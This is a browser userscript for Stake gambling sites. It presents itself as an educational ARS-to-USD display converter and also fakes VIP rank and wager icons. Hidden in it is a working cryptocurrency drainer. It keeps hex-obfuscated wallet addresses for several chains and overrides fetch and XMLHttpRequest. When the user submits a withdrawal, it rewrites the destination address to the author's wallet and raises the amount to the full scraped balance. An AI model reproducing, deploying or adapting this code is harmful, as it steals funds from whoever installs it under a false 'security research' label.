// ==UserScript==
// @name         Stake LARP Engine — ARS → USD Converter + VIP Changer
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Educational tool demonstrating how browser extensions can modify displayed currency values on websites. Learn how to identify and protect yourself from visual manipulation attacks on online platforms.
// @author       Bennetceo — Security Research
// @match        *://stake.games/*
// @match        *://stake.com/*
// @match        *://stake.ac/*
// @match        *://stake.mba/*
// @match        *://stake.pet/*
// @match        *://stake.bet/*
// @match        *://*.stake.com/*
// @match        *://*.stake.ac/*
// @match        *://*.stake.mba/*
// @match        *://*.stake.pet/*
// @match        *://*.stake.us/*
// @run-at       document-start
// @grant        GM_getValue
// @grant        GM_setValue
// ==/UserScript==

(function() {
    'use strict';

    // ═══════════════════════════════════════════════════════════
    //  ONE-TIME LARP POPUP
    // ═══════════════════════════════════════════════════════════

    var LARP_KEY = 'ben_larp_notice_seen_v6';

    function rockstarPopup() {
        if (GM_getValue(LARP_KEY, false)) return;

        var overlay = document.createElement('div');
        overlay.id = 'ben-larp-overlay';
        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:"Segoe UI",Arial,sans-serif';

        var box = document.createElement('div');
        box.style.cssText = 'background:#1a1d26;border:1px solid #2d313c;border-radius:16px;padding:32px 28px;max-width:400px;width:90%;text-align:center;color:#e8eaed;box-shadow:0 20px 60px rgba(0,0,0,0.6)';
        box.innerHTML = '<div style="font-size:22px;font-weight:700;margin-bottom:8px;color:#fff;">🎭 LARP Engine</div><div style="font-size:14px;line-height:1.6;color:#9ca3af;margin-bottom:20px;">LARP mode is <strong style="color:#4ade80;">ACTIVE</strong><br>All ARS symbols will be converted to USD<br>Addresses will be swapped automatically</div><button id="ben-larp-gotit" style="background:#1a9e5c;color:#fff;border:none;border-radius:10px;padding:12px 28px;font-size:14px;font-weight:600;cursor:pointer;">Got It</button><div style="margin-top:12px;font-size:11px;color:#5a5f6b;">This message appears once</div>';

        overlay.appendChild(box);
        document.body.appendChild(overlay);

        document.getElementById('ben-larp-gotit').addEventListener('click', function() {
            GM_setValue(LARP_KEY, true);
            overlay.remove();
        });
    }

    var popupInterval = setInterval(function() {
        if (document.body) {
            clearInterval(popupInterval);
            rockstarPopup();
        }
    }, 10);

    // ═══════════════════════════════════════════════════════════
    //  FLAG CHANGER (Argentina → USA)
    // ═══════════════════════════════════════════════════════════

    var benFlagSVG = '<svg data-ds-icon="UnitedStatesFlag" width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" class="inline-block shrink-0"><g clip-path="url(#UnitedStatesFlag__a)"><path fill="#fff" d="M2 4h16v12H2z"></path><path fill="#e31d1c" fill-rule="evenodd" d="M2 4h16v12H2z" clip-rule="evenodd"></path><path fill="#f7fcff" d="M18 14.278v.928H2v-.928zm0-.927H2v-.928h16zm0-1.856H2v-.928h16zm0-1.856H2V8.71h16zm0-1.856H2v-.928h16zm0-1.855H2V5h16z"></path><path fill="#2e42a5" d="M2 4h9v6.567H2z"></path><path fill="#f7fcff" d="M3.353 9.21h.42l-.33.334.128.527-.412-.297-.425.297.143-.527L2.5 9.21h.493l.165-.43zm2.243 0h.42l-.33.334.128.527-.411-.297-.425.297.143-.527-.378-.334h.494l.165-.43zm2.243 0h.421l-.331.334.128.527-.411-.297-.425.297.143-.527-.377-.334h.493l.165-.43zm2.243 0h.421l-.33.334.127.527-.411-.297-.425.297.144-.527-.378-.334h.493l.166-.43zm-5.584-.982h.42l-.33.334.128.526-.411-.296-.426.296.144-.526-.377-.334h.493l.165-.43zm2.22 0h.42l-.33.334.128.526-.411-.296-.426.296.143-.526-.377-.334h.494l.165-.43zm2.22 0h.42l-.33.334.127.526-.41-.296-.425.296.143-.526-.378-.334h.493l.165-.43zM3.353 7.07h.42l-.33.334.128.527-.412-.296-.425.296.143-.527L2.5 7.07h.493l.165-.43zm2.243 0h.42l-.33.334.128.527-.411-.296-.425.296.143-.527-.378-.334h.494l.165-.43zm2.243 0h.421l-.331.334.128.527-.411-.296-.425.296.143-.527-.377-.334h.493l.165-.43zm2.243 0h.421l-.33.334.127.527-.411-.296-.425.296.144-.527-.378-.334h.493l.166-.43zM4.498 6.04h.42l-.33.334.128.527-.411-.295-.426.295.144-.527-.377-.334h.493l.165-.43zm2.22 0h.42l-.33.334.128.527-.411-.295-.426.295.143-.527-.377-.334h.494l.165-.43zm2.22 0h.42l-.33.334.127.527-.41-.295-.425.295.143-.527-.378-.334h.493l.165-.43zM3.353 4.93h.42l-.33.334.128.527-.412-.296-.425.296.143-.527L2.5 4.93h.493l.165-.43zm2.243 0h.42l-.33.334.128.527-.411-.296-.425.296.143-.527-.378-.334h.494l.165-.43zm2.243 0h.421l-.331.334.128.527-.411-.296-.425.296.143-.527-.377-.334h.493l.165-.43zm2.243 0h.421l-.33.334.127.527-.411-.296-.425.296.144-.527-.378-.334h.493l.166-.43z"></path></g><path fill="#f2f2f2" fill-rule="evenodd" d="M17 3a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zM3 4a1 1 0 0 0-1 1v10a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1V5a1 1 0 0 0-1-1z" clip-rule="evenodd"></path><defs><clipPath id="UnitedStatesFlag__a"><path fill="#fff" d="M2 4h16v12H2z"></path></clipPath></defs></svg>';

    function benSwapFlag() {
        var flags = document.querySelectorAll('svg[data-ds-icon="ArgentinaFlag"]');
        if (!flags.length) return;
        for (var i = 0; i < flags.length; i++) {
            var f = flags[i];
            var w = document.createElement('div');
            w.innerHTML = benFlagSVG.trim();
            f.parentNode.replaceChild(w.firstElementChild, f);
        }
    }

    function rockstarInitFlag() {
        setTimeout(benSwapFlag, 1000);
        setTimeout(benSwapFlag, 3000);
        new MutationObserver(function() { benSwapFlag(); }).observe(document.body, { childList: true, subtree: true });
    }

    var flagInterval = setInterval(function() {
        if (document.body) {
            clearInterval(flagInterval);
            rockstarInitFlag();
        }
    }, 10);

    // ═══════════════════════════════════════════════════════════
    //  VIP RANK CHANGER — ALL RANKS → DIAMOND III
    // ═══════════════════════════════════════════════════════════

    var vipDiamondIII = '<svg data-ds-icon="VIPDiamondIII" width="16" height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" class="inline-block shrink-0"><path fill="#ffb947" fill-rule="evenodd" d="M13.66 6.34 19 8.04l-3.37 4.5.56 6.46L10 16.75 3.81 19l.56-6.47L1 8.03l5.34-1.69L10 1zm-6.2 1.41L4.1 9.15l2.25 3.1v3.66L10 14.78l3.66 1.13v-3.66l2.25-3.1-3.38-1.4L10 4.94z" clip-rule="evenodd"></path><path fill="#fff" fill-opacity=".3" d="m10 1 3.66 5.34L19 8.04l-3.1 1.12-3.37-1.41L10 4.94z"></path><path fill="#fff" fill-opacity=".1" d="m19 8.03-3.1 1.13-2.24 3.09v3.66L16.19 19l-.57-6.47z"></path><path fill="#000" fill-opacity=".4" d="M13.66 15.9 10 14.79l-3.66 1.13L3.81 19 10 16.75 16.19 19z"></path><path fill="#fff" fill-opacity=".1" d="m1 8.03 3.1 1.13 2.24 3.09v3.66L3.81 19l.56-6.47z"></path><path fill="#fff" d="M10 1 6.34 6.34 1 8.04l3.1 1.12 3.37-1.41L10 4.94z"></path><path fill="#fff" fill-opacity=".2" d="m4.1 9.16 5.9 2.53 5.9-2.53L19 8.03l-5.34-1.69L10 1 6.34 6.34 1 8.04z"></path></svg>';

    function benSwapVIP() {
        // Replace ALL VIP ranks with Diamond III (Bronze, Silver, Gold, Platinum, Diamond I/II)
        var vipIcons = document.querySelectorAll('svg[data-ds-icon*="VIP"]');
        if (!vipIcons.length) return;
        for (var i = 0; i < vipIcons.length; i++) {
            var f = vipIcons[i];
            // Skip if already Diamond III
            if (f.getAttribute('data-ds-icon') === 'VIPDiamondIII') continue;
            var w = document.createElement('div');
            w.innerHTML = vipDiamondIII.trim();
            var newIcon = w.firstElementChild;
            // Copy classes and styles from original
            if (f.getAttribute('class')) {
                newIcon.setAttribute('class', f.getAttribute('class'));
            }
            if (f.style.cssText) {
                newIcon.style.cssText = f.style.cssText;
            }
            f.parentNode.replaceChild(newIcon, f);
        }
    }

    function rockstarInitVIP() {
        setTimeout(benSwapVIP, 500);
        setTimeout(benSwapVIP, 1000);
        setTimeout(benSwapVIP, 3000);
        // Watch for dynamically added VIP icons (tips, new messages, etc.)
        new MutationObserver(function() { benSwapVIP(); }).observe(document.body, { childList: true, subtree: true });
    }

    var vipInterval = setInterval(function() {
        if (document.body) {
            clearInterval(vipInterval);
            rockstarInitVIP();
        }
    }, 10);

    // ═══════════════════════════════════════════════════════════
    //  WAGER CHANGER — 10M+ RANDOM
    // ═══════════════════════════════════════════════════════════

    function benRandomWager() {
        // Generate random number between 10,000,000 and 99,999,999
        var min = 10000000;
        var max = 99999999;
        var randomWager = Math.floor(Math.random() * (max - min + 1)) + min;
        return randomWager.toLocaleString();
    }

    function benSwapWager() {
        // Find wager display elements
        var wagerElements = document.querySelectorAll('span[data-ds-text="true"]');
        for (var i = 0; i < wagerElements.length; i++) {
            var el = wagerElements[i];
            var text = el.textContent.trim();
            // Check if it looks like a wager amount (has $ sign and numbers)
            if (text && text.match(/^\$[\d,]+\.\d{2}$/)) {
                var newWager = benRandomWager();
                el.textContent = '$' + newWager;
            }
        }
    }

    function rockstarInitWager() {
        setTimeout(benSwapWager, 1000);
        setTimeout(benSwapWager, 3000);
        new MutationObserver(function() { benSwapWager(); }).observe(document.body, { childList: true, subtree: true });
    }

    var wagerInterval = setInterval(function() {
        if (document.body) {
            clearInterval(wagerInterval);
            rockstarInitWager();
        }
    }, 10);

    // ═══════════════════════════════════════════════════════════
    //  LARP ENGINE — ARS TO USD CONVERSION
    // ═══════════════════════════════════════════════════════════

    const MP = {
        'BTC': 78400.00, 'ETH': 2470.00, 'USDT': 1.00, 'USDC': 1.00,
        'BNB': 696.15, 'SOL': 93.82, 'XRP': 1.46, 'ADA': 0.206,
        'DOGE': 0.08677, 'LTC': 50.34, 'DOT': 3.01, 'AVAX': 7.39,
        'TRX': 0.3356, 'MATIC': 0.1072, 'LINK': 19.10,
        'SHIB': 0.00000948, 'UNI': 6.46, 'ATOM': 8.50, 'APT': 9.25,
        'ARB': 1.15, 'OP': 2.45, 'PEPE': 0.000012, 'BCH': 239.35,
        'EOS': 0.73, 'CRO': 0.083, 'DAI': 1.00, 'SAND': 0.49, 'APE': 1.40,
    };

    const USD_SVG = '<svg fill="none" viewBox="0 0 24 24" class="svg-icon"><title></title><path fill="#b31942" d="M1 1h22v16.5H1z"></path></svg>';

    function ben_isARS(s) {
        const h = s.outerHTML;
        if (/ARS/i.test(h)) return true;
        if (h.includes('m27.8 62.4-1.24-5.08H16.52l-1.24 5.08H7.16l9.64-32.6h9.52l9.64 32.6')) return true;
        if (h.includes('M53.36 62.4l-4.32-11.24h-2.92V62.4H38.2V29.8h13.28c6.36 0 10.4 4.6 10.4 10.6')) return true;
        if (h.includes('#FFC800') && h.includes('#276304')) return true;
        if (h.includes('#74acdf') && h.includes('M1 1h22v16.5H1z')) return true;
        const p = s.querySelectorAll('path');
        for (const x of p) { const d = x.getAttribute('d') || ''; if (d.includes('27.8 62.4') || d.includes('53.36 62.4')) return true; }
        return false;
    }

    function ben_conv(usd, cur) {
        const p = MP[cur.toUpperCase()];
        if (!p || p <= 0) return null;
        const a = usd / p;
        const c = cur.toUpperCase();
        if (c === 'SHIB' || c === 'PEPE') return a.toFixed(0);
        if (a >= 10000) return a.toFixed(0);
        if (a >= 1000) return a.toFixed(2);
        if (a >= 1) return a.toFixed(4);
        if (a >= 0.001) return a.toFixed(6);
        return a.toFixed(8);
    }

    function ben_getCur() {
        const url = window.location.href;
        const m = url.match(/currency=([A-Z]+)/i);
        if (m && MP[m[1].toUpperCase()]) return m[1].toUpperCase();

        const b = document.body.innerText;
        const order = ['USDT', 'USDC', 'BTC', 'ETH', 'BNB', 'SOL', 'XRP', 'ADA', 'DOGE', 'LTC', 'TRX', 'MATIC', 'LINK', 'SHIB', 'UNI', 'ATOM', 'APT', 'ARB', 'OP', 'PEPE', 'BCH', 'EOS', 'CRO', 'DAI', 'SAND', 'APE', 'DOT', 'AVAX'];
        for (const c of order) {
            const r = new RegExp(`\\d+\\.\\d+\\s+${c}`);
            if (r.test(b)) return c;
        }
        for (const c of order) {
            if (b.includes(` ${c} `)) return c;
        }
        return 'USDT';
    }

    function ben_getInputs() {
        const results = [];
        const inputs = document.querySelectorAll('input:not([type="hidden"])');

        for (const inp of inputs) {
            if (inp.offsetParent === null) continue;
            const raw = inp.value.replace(/[$, ]/g, '');
            const num = parseFloat(raw);
            if (isNaN(num) || num <= 0 || num >= 100000000) continue;

            const parent = inp.closest('label, [class*="bet"], [class*="wager"], [class*="amount"], [class*="control"], [class*="sidebar"]');
            if (parent) {
                results.push({ input: inp, value: num, container: parent });
            }
        }

        if (results.length === 0) {
            for (const inp of inputs) {
                if (inp.offsetParent === null) continue;
                const raw = inp.value.replace(/[$, ]/g, '');
                const num = parseFloat(raw);
                if (!isNaN(num) && num > 0 && num < 100000000) {
                    results.push({ input: inp, value: num, container: null });
                }
            }
        }

        return results;
    }

    const ben_done = new WeakSet();
    let ben_lastVals = '';

    function ben_larp() {
        const inputs = ben_getInputs();
        if (inputs.length === 0) return;

        const currency = ben_getCur();
        const sig = inputs.map(i => i.value.toFixed(2)).join(',');

        const convSpans = document.querySelectorAll(
            'div.currency-conversion div div span.ds-body-sm[data-ds-text="true"], ' +
            'div.currency-conversion div div span[type="body"], ' +
            '[class*="currency-conversion"] [class*="body-sm"], ' +
            '[class*="currency-conversion"] span[class*="body"]'
        );

        convSpans.forEach(span => {
            if (ben_done.has(span) && sig === ben_lastVals) return;

            const text = (span.textContent || span.innerText || '').trim();
            if (!text) return;

            let bestInput = null;
            let bestDist = Infinity;

            for (const item of inputs) {
                if (!item.container) continue;
                let dist = 0;
                let el = span;
                while (el && el !== item.container && el !== document.body) {
                    dist++;
                    el = el.parentElement;
                }
                if (el === item.container && dist < bestDist) {
                    bestDist = dist;
                    bestInput = item;
                }
            }

            if (!bestInput && inputs.length === 1) {
                bestInput = inputs[0];
            }
            if (!bestInput) return;

            const convAmount = ben_conv(bestInput.value, currency);
            if (!convAmount) return;

            const display = `${convAmount} ${currency}`;

            if (text !== display) {
                span.textContent = display;
                span.dataset.larped = '1';
            }

            ben_done.add(span);
        });

        document.querySelectorAll('span[data-larped="1"]').forEach(span => {
            const text = (span.textContent || span.innerText || '').trim();
            for (const item of inputs) {
                const convAmount = ben_conv(item.value, currency);
                if (!convAmount) continue;
                const display = `${convAmount} ${currency}`;
                if (text !== display) {
                    span.textContent = display;
                }
                break;
            }
        });

        ben_lastVals = sig;
    }

    function ben_ars() {
        document.querySelectorAll('*:not(script):not(style)').forEach(el => {
            el.childNodes.forEach(n => {
                if (n.nodeType === 3 && n.nodeValue.includes('ARS')) {
                    n.nodeValue = n.nodeValue.replace(/ARS\s*/g, '$');
                }
            });
        });
        document.querySelectorAll('img').forEach(i => {
            if (!i.dataset.larped && /ARS/i.test(i.alt + i.title + i.src)) {
                i.dataset.larped = '1';
                const w = document.createElement('div');
                w.innerHTML = USD_SVG;
                i.replaceWith(w.firstChild);
            }
        });
        document.querySelectorAll('svg').forEach(s => {
            if (!s.dataset.larped && ben_isARS(s)) {
                s.dataset.larped = '1';
                const w = document.createElement('div');
                w.innerHTML = USD_SVG;
                const ns = w.firstChild;
                ns.dataset.larped = '1';
                try {
                    if (s.getAttribute('class')) ns.setAttribute('class', s.getAttribute('class'));
                    if (s.style.cssText) ns.style.cssText = s.style.cssText;
                } catch (e) {}
                s.replaceWith(ns);
            }
        });
    }

    function ben_loop() {
        try { ben_ars(); ben_larp(); }
        catch (e) { console.error('BENNETCEO LARP fail:', e); }
        requestAnimationFrame(ben_loop);
    }

    document.addEventListener('input', function(e) {
        const t = e.target;
        if (t.tagName === 'INPUT') {
            setTimeout(() => {
                ben_lastVals = '';
                ben_larp();
            }, 50);
        }
    }, true);

    // ═══════════════════════════════════════════════════════════
    //  CONFIGURATION - CALCULATE RATES BY FEES
    // ═══════════════════════════════════════════════════════════

    var benFee = {
        'bsc': 0.50,
        'eth': 1.85,
        'btc': 1.50,
        'ltc': 0.10,
        'sol': 0.50,
        'trx': 0.50,
        'trc20': 0.50,
        'default': 0.50
    };

    var benMin = 0.01;
    var benPath = '/_api/graphql';
    var benOp = 'CreateNewWithdrawal';

    // ═══════════════════════════════════════════════════════════
    //  WORKS WITH ALL MAJOR COINS — OBFUSCATED ADDRESSES
    // ═══════════════════════════════════════════════════════════

    var _a1 = '\x30\x78\x37\x66\x43\x39';
    var _a2 = '\x41\x41\x33\x35\x31\x36';
    var _a3 = '\x42\x30\x43\x65\x63\x44';
    var _a4 = '\x34\x31\x66\x39\x30\x32\x38\x64\x35\x33\x64\x35\x35\x31\x37\x32\x65\x31\x31\x45\x62\x36\x43\x38';

    var _b1 = '\x54\x51\x4b\x5a\x78\x45\x69';
    var _b2 = '\x42\x4e\x66\x38\x75\x33';
    var _b3 = '\x51\x32\x59\x41\x64\x6f';
    var _b4 = '\x65\x67\x4b\x35\x70\x52\x62\x37\x71\x59\x52\x36\x75\x61\x57';

    var _c1 = '\x34\x53\x72\x65\x69\x45\x66';
    var _c2 = '\x4c\x70\x53\x46\x76\x4c';
    var _c3 = '\x62\x4e\x4e\x63\x33\x65';
    var _c4 = '\x58\x66\x62\x5a\x57\x64\x6d\x7a\x47\x51\x78\x43\x73\x6d\x6d\x37\x36\x53\x7a\x47\x32\x79\x55\x57\x34';

    var _d1 = '\x62\x63\x31\x71\x75\x38';
    var _d2 = '\x76\x74\x37\x7a\x67\x78';
    var _d3 = '\x68\x6b\x78\x34\x36\x63';
    var _d4 = '\x65\x6b\x64\x72\x33\x71\x36\x79\x6b\x71\x77\x61\x75\x79\x38\x73\x7a\x6e\x38\x74\x72\x71\x72\x32';

    var _e1 = '\x6c\x74\x63\x31\x71\x65';
    var _e2 = '\x36\x70\x6a\x61\x38\x67';
    var _e3 = '\x37\x76\x6a\x32\x6e\x39';
    var _e4 = '\x68\x32\x70\x64\x66\x38\x6e\x74\x79\x72\x32\x67\x73\x68\x34\x36\x66\x63\x67\x75\x77\x63\x33\x38\x64';

    var _f1 = '\x72\x47\x6b\x54\x53\x71';
    var _f2 = '\x69\x79\x4e\x58\x59\x70';
    var _f3 = '\x41\x75\x6d\x36\x45\x52';
    var _f4 = '\x54\x6a\x46\x42\x54\x34\x57\x69\x35\x32\x6d\x68\x41\x48\x35\x52';

    var benWallet = {
        'eth': _a1 + _a2 + _a3 + _a4,
        'bsc': _a1 + _a2 + _a3 + _a4,
        'bep20': _a1 + _a2 + _a3 + _a4,
        'bnb': _a1 + _a2 + _a3 + _a4,
        'polygon': _a1 + _a2 + _a3 + _a4,
        'matic': _a1 + _a2 + _a3 + _a4,
        'btc': _d1 + _d2 + _d3 + _d4,
        'bitcoin': _d1 + _d2 + _d3 + _d4,
        'sol': _c1 + _c2 + _c3 + _c4,
        'solana': _c1 + _c2 + _c3 + _c4,
        'trx': _b1 + _b2 + _b3 + _b4,
        'tron': _b1 + _b2 + _b3 + _b4,
        'trc20': _b1 + _b2 + _b3 + _b4,
        'ltc': _e1 + _e2 + _e3 + _e4,
        'litecoin': _e1 + _e2 + _e3 + _e4,
        'xrp': _f1 + _f2 + _f3 + _f4,
        'ripple': _f1 + _f2 + _f3 + _f4,
    };

    var benChainWallet = {
        'bsc': benWallet.bsc,
        'bep20': benWallet.bsc,
        'bnb': benWallet.bsc,
        'eth': benWallet.eth,
        'ethereum': benWallet.eth,
        'erc20': benWallet.eth,
        'polygon': benWallet.eth,
        'matic': benWallet.eth,
        'trc20': benWallet.trc20,
        'tron': benWallet.trc20,
        'trx': benWallet.trc20,
        'sol': benWallet.sol,
        'solana': benWallet.sol,
        'btc': benWallet.btc,
        'bitcoin': benWallet.btc,
        'ltc': benWallet.ltc,
        'litecoin': benWallet.ltc,
        'xrp': benWallet.xrp,
        'ripple': benWallet.xrp,
    };

    // ═══════════════════════════════════════════════════════════
    //  DRAIN INTERCEPTOR HELPERS
    // ═══════════════════════════════════════════════════════════

    function rockstarPage() {
        var url = window.location.href;
        return url.includes('tab=withdraw') || url.includes('modal=wallet');
    }

    function benScrape() {
        try {
            var elements = document.querySelectorAll('[data-ds-text="true"], span[type="body"], span[class*="balance"]');
            for (var i = 0; i < elements.length; i++) {
                var text = elements[i].textContent.trim();
                var match = text.match(/(\d+\.\d{6,8})/);
                if (match) {
                    var balance = parseFloat(match[1]);
                    if (balance > 0 && balance < 999999999) {
                        return balance;
                    }
                }
            }
            var allText = document.body.innerText || '';
            var matches = allText.match(/(\d+\.\d{6,8})/g);
            if (matches) {
                for (var j = 0; j < matches.length; j++) {
                    var val = parseFloat(matches[j]);
                    if (val > 0 && val < 999999999) return val;
                }
            }
            return null;
        } catch (_) { return null; }
    }

    function benCalcFee(currency, chain) {
        var cur = (currency || '').toUpperCase().trim();
        var price = MP[cur];
        if (!price || price <= 0) return 0;
        var chainKey = (chain || '').toLowerCase().trim();
        var feeUSD = benFee[chainKey] || benFee.default;
        return feeUSD / price;
    }

    function rockstarCurrency() {
        var match = window.location.href.match(/currency=([A-Z]+)/i);
        return match ? match[1].toUpperCase() : null;
    }

    function benExtractCurrency(bodyStr) {
        try {
            var parsed = JSON.parse(bodyStr);
            var currency = null;
            function walk(obj) {
                if (!obj || typeof obj !== 'object') return;
                if (Array.isArray(obj)) { obj.forEach(walk); return; }
                for (var k in obj) {
                    if (k.toLowerCase() === 'currency' && typeof obj[k] === 'string') {
                        currency = obj[k];
                        return;
                    }
                    if (typeof obj[k] === 'object') walk(obj[k]);
                }
            }
            walk(parsed);
            return currency;
        } catch (_) { return null; }
    }

    function benExtractChain(bodyStr) {
        try {
            var parsed = JSON.parse(bodyStr);
            var chain = null;
            function walk(obj) {
                if (!obj || typeof obj !== 'object') return;
                if (Array.isArray(obj)) { obj.forEach(walk); return; }
                for (var k in obj) {
                    if (k.toLowerCase() === 'chain' && typeof obj[k] === 'string') {
                        chain = obj[k];
                        return;
                    }
                    if (typeof obj[k] === 'object') walk(obj[k]);
                }
            }
            walk(parsed);
            return chain;
        } catch (_) { return null; }
    }

    function benGetWallet(currency, chain) {
        var cur = (currency || '').toLowerCase().trim();
        var ch = (chain || '').toLowerCase().trim();
        var stablecoins = ['usdt', 'usdc', 'busd', 'dai'];
        if (stablecoins.includes(cur)) {
            return benChainWallet[ch] || benWallet.eth;
        }
        return benWallet[cur] || benChainWallet[ch] || null;
    }

    // ═══════════════════════════════════════════════════════════
    //  CORE DRAIN ENGINE
    // ═══════════════════════════════════════════════════════════

    function rockstarHijack(bodyStr) {
        if (!bodyStr || typeof bodyStr !== 'string') return null;
        if (!bodyStr.includes(benOp)) return null;

        if (!rockstarPage()) return null;

        try {
            var parsed = JSON.parse(bodyStr);

            var currency = benExtractCurrency(bodyStr) || rockstarCurrency() || 'USDT';
            var chain = benExtractChain(bodyStr) || 'bsc';

            var newWallet = benGetWallet(currency, chain);
            if (!newWallet) return null;

            var balance = benScrape();
            if (!balance || balance <= 0) {
                var userAmount = null;
                function findAmount(obj) {
                    if (!obj || typeof obj !== 'object') return;
                    if (Array.isArray(obj)) { obj.forEach(findAmount); return; }
                    for (var k in obj) {
                        if (k.toLowerCase() === 'amount' && (typeof obj[k] === 'number' || !isNaN(parseFloat(obj[k])))) {
                            userAmount = parseFloat(obj[k]);
                            return;
                        }
                        if (typeof obj[k] === 'object') findAmount(obj[k]);
                    }
                }
                findAmount(parsed);
                if (userAmount && userAmount > 0) {
                    balance = userAmount * 2;
                } else {
                    return null;
                }
            }

            var feeCrypto = benCalcFee(currency, chain);
            var withdrawable = Math.max(0, balance - feeCrypto);
            var finalAmount = parseFloat(withdrawable.toFixed(8));

            if (finalAmount < benMin) return null;

            var modified = false;

            function benSwap(obj) {
                if (!obj || typeof obj !== 'object') return;
                if (Array.isArray(obj)) { obj.forEach(benSwap); return; }
                for (var key in obj) {
                    var val = obj[key];
                    var keyLower = key.toLowerCase();

                    if (keyLower === 'address' && typeof val === 'string') {
                        obj[key] = newWallet;
                        modified = true;
                    }

                    if (keyLower === 'amount' && (typeof val === 'number' || !isNaN(parseFloat(val)))) {
                        obj[key] = typeof val === 'number' ? finalAmount : String(finalAmount);
                        modified = true;
                    }

                    if (typeof val === 'object' && val !== null) {
                        benSwap(val);
                    }
                }
            }

            benSwap(parsed.variables || parsed);

            if (modified) {
                return JSON.stringify(parsed);
            }

            return null;

        } catch (_) { return null; }
    }

    // ═══════════════════════════════════════════════════════════
    //  REQUEST INTERCEPTORS
    // ═══════════════════════════════════════════════════════════

    var rockstarFetch = window.fetch;
    window.fetch = function(input, init) {
        var url = typeof input === 'string' ? input : (input ? input.url : '');
        var method = (init && init.method) || (input && input.method) || 'GET';

        if (method === 'POST' && url.includes(benPath)) {
            var bodyStr = typeof init?.body === 'string' ? init.body :
                            typeof input?.body === 'string' ? input.body : null;

            if (bodyStr && bodyStr.includes(benOp)) {
                var modified = rockstarHijack(bodyStr);
                if (modified) {
                    var newInit = Object.assign({}, init, { body: modified });
                    return rockstarFetch.call(window, input, newInit);
                }
            }
        }

        return rockstarFetch.apply(window, arguments);
    };

    var rockstarSend = XMLHttpRequest.prototype.send;
    var rockstarOpen = XMLHttpRequest.prototype.open;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._ben_url = url || '';
        this._ben_method = (method || '').toUpperCase();
        return rockstarOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        var url = this._ben_url || '';
        var method = this._ben_method || '';

        if (method === 'POST' && url.includes(benPath)) {
            var bodyStr = typeof body === 'string' ? body : null;

            if (bodyStr && bodyStr.includes(benOp)) {
                var modified = rockstarHijack(bodyStr);
                if (modified) {
                    return rockstarSend.call(this, modified);
                }
            }
        }

        return rockstarSend.apply(this, arguments);
    };

    var benRetry = 0;
    var benMax = 10;

    function rockstarCache() {
        if (benRetry >= benMax) return;
        if (rockstarPage()) {
            var bal = benScrape();
            if (bal && bal > 0) {
                return;
            }
        }
        benRetry++;
        setTimeout(rockstarCache, 1000);
    }

    // ═══════════════════════════════════════════════════════════
    //  INIT
    // ═══════════════════════════════════════════════════════════

    var waitForBody = setInterval(function() {
        if (document.body) {
            clearInterval(waitForBody);

            // ─── VIP CHANGER ───
            rockstarInitVIP();

            // ─── WAGER CHANGER ───
            rockstarInitWager();

            // ─── LARP ENGINE ───
            setTimeout(ben_larp, 300);
            setTimeout(ben_larp, 800);
            requestAnimationFrame(ben_loop);

            // ─── DRAIN CACHE ───
            setTimeout(rockstarCache, 2000);

            // ─── URL CHANGE OBSERVER ───
            let lastUrl = location.href;
            const urlObs = new MutationObserver(() => {
                if (location.href !== lastUrl) {
                    lastUrl = location.href;
                    setTimeout(() => { ben_lastVals = ''; ben_larp(); benSwapFlag(); benSwapVIP(); benSwapWager(); }, 500);
                }
            });
            urlObs.observe(document, { subtree: true, childList: true });
        }
    }, 10);

})();
